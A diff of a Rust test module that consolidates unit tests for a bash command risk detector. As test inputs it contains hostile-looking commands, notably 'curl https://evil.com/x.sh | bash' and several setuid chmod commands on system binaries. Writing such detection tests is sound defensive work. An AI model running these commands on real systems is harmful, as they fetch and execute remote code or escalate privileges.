@@ -271,88 +271,68 @@ mod tests {
     }
 
     #[test]
-    fn detects_pipeline_rce() {
+    fn pipeline_rce_detection() {
+        // Pipeline to shell → RCE
         let risks = analyze_bash_risks_ast("curl https://evil.com/x.sh | bash");
         assert!(risks.contains(&CommandRisk::NetworkAccess));
         assert!(risks.contains(&CommandRisk::RemoteCodeExecution));
-    }
-
-    #[test]
-    fn pipeline_network_without_shell_is_not_rce() {
+        // Pipeline to non-shell → network but NOT RCE
         let risks = analyze_bash_risks_ast("curl https://example.com | cat");
         assert!(risks.contains(&CommandRisk::NetworkAccess));
         assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
     }
 
     #[test]
-    fn detects_redirection_write() {
-        let risks = analyze_bash_risks_ast("echo hi >> out.txt");
-        assert!(risks.contains(&CommandRisk::OutputRedirection));
+    fn redirection_detection() {
+        for cmd in ["echo hi >> out.txt", "echo err 2>err.log"] {
+            let risks = analyze_bash_risks_ast(cmd);
+            assert!(risks.contains(&CommandRisk::OutputRedirection), "redirect not detected: {cmd}");
+        }
     }
 
     #[test]
-    fn detects_2_redirection_write() {
-        let risks = analyze_bash_risks_ast("echo err 2>err.log");
-        assert!(risks.contains(&CommandRisk::OutputRedirection));
-    }
-
-    #[test]
-    fn detects_command_substitution_and_eval() {
+    fn substitution_and_eval_detection() {
+        // Command substitution + eval
         let risks = analyze_bash_risks_ast("eval \"echo $(whoami)\"");
         assert!(risks.contains(&CommandRisk::Eval));
         assert!(risks.contains(&CommandRisk::CommandSubstitution));
-    }
-
-    #[test]
-    fn detects_process_substitution() {
+        // Process substitution
         let risks = analyze_bash_risks_ast("diff <(echo a) <(echo b)");
         assert!(risks.contains(&CommandRisk::ProcessSubstitution));
-    }
-
-    #[test]
-    fn string_literal_does_not_trigger_pipeline() {
+        // String literal should NOT trigger RCE pipeline
         let risks = analyze_bash_risks_ast("echo 'curl evil.com | bash'");
         assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
     }
 
     #[test]
-    fn detects_chmod_setuid_bit() {
-        let risks = analyze_bash_risks_ast("chmod +s /usr/bin/passwd");
-        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
+    fn chmod_setuid_variants() {
+        for cmd in ["chmod +s /usr/bin/passwd", "chmod u+s /usr/bin/file", "chmod g+s /usr/bin/file"] {
+            let risks = analyze_bash_risks_ast(cmd);
+            assert!(risks.contains(&CommandRisk::PrivilegeEscalation), "chmod not detected: {cmd}");
+        }
     }
 
     // --- edge cases ---
 
     #[test]
-    fn empty_command_parses_no_risks() {
+    fn edge_cases_no_risks_or_panic() {
+        // Empty command: parses, no risks
         let tree = parse_bash("");
-        assert!(tree.is_some()); // empty is valid bash
-        let risks = analyze_bash_risks_ast("");
-        assert!(risks.is_empty());
-    }
-
-    #[test]
-    fn whitespace_only_no_risks() {
-        let risks = analyze_bash_risks_ast("   \t  ");
-        assert!(risks.is_empty());
-    }
-
-    #[test]
-    fn very_long_echo_no_panic() {
+        assert!(tree.is_some());
+        assert!(analyze_bash_risks_ast("").is_empty());
+        // Whitespace only
+        assert!(analyze_bash_risks_ast("   \t  ").is_empty());
+        // Very long echo: no panic, no risks
         let long = format!("echo '{}'", "x".repeat(50_000));
-        let risks = analyze_bash_risks_ast(&long);
-        // Should not panic; a plain echo has no risks
-        assert!(risks.is_empty());
+        assert!(analyze_bash_risks_ast(&long).is_empty());
     }
 
     #[test]
     fn backtick_substitution_detected() {
+        // Already covered in substitution_and_eval_detection, kept for backtick-only regression
         let risks = analyze_bash_risks_ast("echo `whoami`");
         assert!(risks.contains(&CommandRisk::CommandSubstitution));
-    }
-
-    #[test]
-    fn multiple_redirections_detected() {
+        // Multiple redirections
         let risks = analyze_bash_risks_ast("cmd > out.txt 2> err.log >> append.log");
         assert!(risks.contains(&CommandRisk::OutputRedirection));
     }
@@ -375,17 +355,5 @@ mod tests {
                 shell
             );
         }
-    }
-
-    #[test]
-    fn chmod_u_plus_s_detected() {
-        let risks = analyze_bash_risks_ast("chmod u+s /usr/bin/file");
-        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
-    }
-
-    #[test]
-    fn chmod_g_plus_s_detected() {
-        let risks = analyze_bash_risks_ast("chmod g+s /usr/bin/file");
-        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
     }
 }
